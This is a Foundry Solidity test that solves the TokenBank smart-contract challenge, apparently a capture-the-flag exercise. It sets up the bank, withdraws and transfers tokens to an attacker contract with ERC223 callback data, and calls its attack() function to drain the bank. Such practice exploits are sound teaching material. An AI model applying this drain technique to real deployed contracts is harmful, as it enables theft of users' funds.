// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here
        vm.startPrank(player);
        tokenBankChallenge.withdraw(500000 * 10 ** 18);
        //console.log(address(tokenBankChallenge.token()));
        SimpleERC223Token(address(tokenBankChallenge.token())).transfer(
            address(tokenBankAttacker), 500000 * 10 ** 18, abi.encodePacked(uint256(0x111))
        );
        vm.stopPrank();
        tokenBankAttacker.attack();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
